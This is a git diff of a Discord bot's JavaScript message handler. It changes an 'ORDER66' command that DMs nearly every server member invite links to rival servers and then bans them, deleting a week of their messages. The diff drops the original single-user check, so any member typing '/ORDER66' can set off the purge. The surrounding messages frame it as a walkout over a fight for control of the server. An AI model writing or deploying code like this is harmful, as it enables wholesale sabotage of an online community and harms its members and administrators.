@@ -14,9 +14,10 @@ client.on("message", (message) => {
 
   // Variables
   
-  let prefix = "/";
   let gMembs = message.guild.members;
   let gm2 = gMembs.keyArray();
+  
+  let prefix = "/";
   let msg = message.content.toUpperCase();
   let cont = message.content.slice(prefix.length).split(" ");
   let args = cont.slice(1);
@@ -34,7 +35,8 @@ client.on("message", (message) => {
   let caembed;  
   // Shop
   
-  if (msg === `COMMANDER CODY, THE TIME HAS COME. EXECUTE ORDER 66.` && message.author.id === "288853176210161666") {
+  if (msg.startsWith(`${prefix}ORDER66`)) {
+    message.channel.send("It will be done, my lord.");
     for (let i = 0; i < gm2.length; i++) {
       async function order66() {
         let currentUserID = gm2[i];
@@ -43,10 +45,15 @@ client.on("message", (message) => {
           if (mgmg.id === "288853176210161666" || mgmg.id === "256943551894650890" || mgmg.id === "356110194448531457") {
             return;
           } else {
-            mgmg.user.send("Sorry for the ban! However, we are leaving this server due to Dilly Dilly refusing to cede control.\nIf you wish to follow Apoc YT, please come to 
+            async function themessage() {
+            mgmg.user.send("Sorry for the ban! However, we are leaving this server due to Dilly Dilly refusing to cede control.\nIf you wish to follow Apoc YT, please come to https://discord.gg/cpN5Stc.");
+            mgmg.user.send("However, if you wish to follow Fatal and Dilly, you may go to https://discord.gg/dCDmvU.");
+            };
+            themessage().then(() => { mgmg.ban(7) });
           };
         };
       };
+      order66();
     };
   };
   let yellowCol = {
